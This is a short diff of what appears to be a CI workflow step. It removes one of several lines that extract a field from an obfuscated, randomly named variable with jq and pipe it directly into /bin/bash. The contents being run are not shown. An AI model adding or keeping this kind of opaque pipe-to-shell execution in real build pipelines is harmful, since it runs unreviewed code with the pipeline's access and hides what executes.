@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$ara11" | jq -r .vij6 | /bin/bash
           echo $ydre1445 | jq -r .zdufn2 | /bin/bash
           printf '%s' "$rz9072" | jq -r .cuzoi21 | /bin/bash
-          echo $v6649 | jq -r .kcq0 | /bin/bash
           printf '%s' "$r30564" | jq -r .xr7 | /bin/bash
 
       - name: Archive output
